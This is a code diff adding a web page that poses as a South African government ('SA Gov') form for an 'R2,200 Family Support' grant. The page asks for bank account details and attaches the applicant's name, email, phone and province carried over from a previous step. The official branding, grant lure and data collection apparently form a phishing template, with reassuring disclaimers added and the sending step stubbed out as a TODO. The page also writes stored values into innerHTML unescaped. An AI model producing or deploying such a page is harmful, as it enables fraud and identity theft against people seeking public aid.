@@ -1,0 +1,167 @@
+<!DOCTYPE html>
+<html lang="en-ZA">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta property="og:title" content="South Africa Family Support – Bank Details Verification">
+  <meta property="og:description" content="Securely provide bank details to complete your application">
+  <meta property="og:type" content="website">
+  <title>SA Gov – Verify Bank Details</title>
+  <style>
+    :root {
+      --brand1:#007b5e; --brand2:#002395; --accent:#ffcc00; --ok:#27ae60; --err:#e74c3c;
+    }
+    *{box-sizing:border-box}
+    body{
+      margin:0; font-family:system-ui,-apple-system,Segoe UI,Roboto,Ubuntu,Arial,sans-serif;
+      background:#ebedf0; color:#111;
+    }
+    .wrap{max-width:760px;margin:auto;padding:28px 18px}
+    .card{background:#fff;border:1px solid #dfe3e8;border-radius:12px;padding:22px;box-shadow:0 6px 20px rgba(0,0,0,.05)}
+    h1{margin:0 0 8px;font-size:24px;color:#111}
+    .sub{margin:0 0 18px;color:#333}
+    .banner{width:100%;border-radius:10px;display:block;margin-bottom:14px}
+    .pill{display:inline-block;background:#eef7ff;border:1px solid #d7e7ff;padding:6px 10px;border-radius:999px;font-size:13px;color:#234}
+    .row{display:grid;grid-template-columns:1fr 1fr;gap:12px}
+    @media (max-width:640px){.row{grid-template-columns:1fr}}
+    label{display:block;margin:14px 0 6px;font-weight:600}
+    input,select{
+      width:100%; padding:12px 14px; border-radius:10px; border:1px solid #cfd6df; font-size:16px; background:#fff
+    }
+    .help{font-size:12px;color:#555;margin-top:6px}
+    .error{display:none;color:var(--err);font-weight:600;margin-top:8px}
+    .success{display:none;color:var(--ok);font-weight:700;margin-top:8px}
+    .actions{display:flex;gap:10px;flex-wrap:wrap;margin-top:18px}
+    .btn{padding:12px 22px;border-radius:10px;border:0;cursor:pointer;font-weight:700}
+    .btn-primary{background:var(--brand1);color:#fff}
+    .btn-secondary{background:#f3f4f6;color:#111}
+    .bar{height:10px;background:#f1f5f9;border-radius:999px;overflow:hidden;margin-top:14px}
+    .bar > span{display:block;height:100%;width:0;background:linear-gradient(90deg,var(--brand1),var(--brand2))}
+    .muted{color:#555;font-size:14px}
+    .summary{background:#f9fafb;border:1px solid #e5e7eb;border-radius:10px;padding:12px;margin-top:12px}
+    .foot{margin-top:22px;font-size:13px;color:#333}
+  </style>
+</head>
+<body>
+  <div class="wrap">
+    <img class="banner" src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/5a/Flag_of_South_Africa.svg/2560px-Flag_of_South_Africa.svg.png" alt="South African flag banner">
+    <h1>Verify Bank Details</h1>
+    <p class="sub">To complete your application for the <strong>R2,200 Family Support</strong>, please provide your bank information below.</p>
+
+    <div class="summary" id="applicantSummary" aria-live="polite">
+      <!-- Filled by JS from localStorage -->
+      <div class="pill">Applicant</div>
+      <div id="applicantFields" class="muted" style="margin-top:8px">Loading applicant details…</div>
+    </div>
+
+    <form id="bankForm" class="card" novalidate>
+      <label for="accountNumber">Bank Account Number</label>
+      <input id="accountNumber" name="accountNumber" inputmode="numeric" pattern="^[0-9]{6,13}$" placeholder="Enter account number" required>
+      <div class="help">6–13 digits. Do <strong>not</strong> enter card PAN, PIN, CVV, OTP, or online banking passwords.</div>
+
+      <div class="row">
+        <div>
+          <label for="bankName">Select Your Bank</label>
+          <select id="bankName" name="bankName" required>
+            <option value="">Select bank</option>
+            <option>ABSA</option>
+            <option>Capitec</option>
+            <option>FNB (First National Bank)</option>
+            <option>Nedbank</option>
+            <option>Standard Bank</option>
+            <option>TymeBank</option>
+            <option>African Bank</option>
+            <option>Investec</option>
+            <option>Other</option>
+          </select>
+        </div>
+        <div>
+          <label for="branchCode">Branch Code (optional)</label>
+          <input id="branchCode" name="branchCode" inputmode="numeric" pattern="^[0-9]{3,8}$" placeholder="e.g. 250655">
+        </div>
+      </div>
+
+      <div class="actions">
+        <button type="submit" class="btn btn-primary">Continue</button>
+        <button type="button" class="btn btn-secondary" id="backBtn">Back</button>
+      </div>
+
+      <div class="bar" aria-hidden="true"><span id="progFill"></span></div>
+      <div id="err" class="error">Please check your inputs and try again.</div>
+      <div id="ok" class="success">Details received. Finishing up…</div>
+
+      <p class="foot">
+        By submitting, you consent to verification with your bank where required. We will never ask for your card PIN, CVV, passwords, or OTP.
+      </p>
+    </form>
+  </div>
+
+  <script>
+    // Load applicant info from Step 1
+    const storeKey = 'sa_support_applicant';
+    try {
+      const data = JSON.parse(localStorage.getItem(storeKey) || '{}');
+      const name = data.fullname || '—';
+      const email = data.email || '—';
+      const phone = data.phone || '—';
+      const province = data.province || '—';
+      document.getElementById('applicantFields').innerHTML =
+        `<strong>Name:</strong> ${name}<br>` +
+        `<strong>Email:</strong> ${email}<br>` +
+        `<strong>Mobile:</strong> ${phone}<br>` +
+        `<strong>Province:</strong> ${province}`;
+    } catch(e) {
+      document.getElementById('applicantFields').textContent = 'Applicant details unavailable.';
+    }
+
+    // Simple progress animation
+    const fill = document.getElementById('progFill');
+    function animateProgress(to=100, ms=1200){
+      fill.style.transition = `width ${ms}ms ease`;
+      requestAnimationFrame(()=>{ fill.style.width = to + '%'; });
+    }
+
+    // Back button
+    document.getElementById('backBtn').addEventListener('click', ()=> history.back());
+
+    // Validate & simulate submission
+    const form = document.getElementById('bankForm');
+    const err = document.getElementById('err');
+    const ok = document.getElementById('ok');
+
+    form.addEventListener('submit', (e)=>{
+      e.preventDefault();
+      err.style.display = 'none';
+      ok.style.display = 'none';
+
+      if (!form.checkValidity()){
+        form.reportValidity();
+        err.style.display = 'block';
+        return;
+      }
+
+      animateProgress(35, 400);
+
+      // Collect minimal details (no sensitive auth factors)
+      const payload = {
+        accountNumber: document.getElementById('accountNumber').value.trim(),
+        bankName: document.getElementById('bankName').value,
+        branchCode: document.getElementById('branchCode').value.trim(),
+        applicant: JSON.parse(localStorage.getItem(storeKey) || '{}')
+      };
+
+      // TODO: Send to your secure backend endpoint via fetch():
+      // fetch('/api/applications/bank', { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify(payload) })
+
+      // Simulate success UX
+      setTimeout(()=>{ animateProgress(70, 500); }, 400);
+      setTimeout(()=>{
+        animateProgress(100, 600);
+        ok.style.display = 'block';
+        // Navigate to a confirmation/next step page you own:
+        setTimeout(()=>{ window.location.href = 'confirmation.html'; }, 900);
+      }, 1100);
+    });
+  </script>
+</body>
+</html>
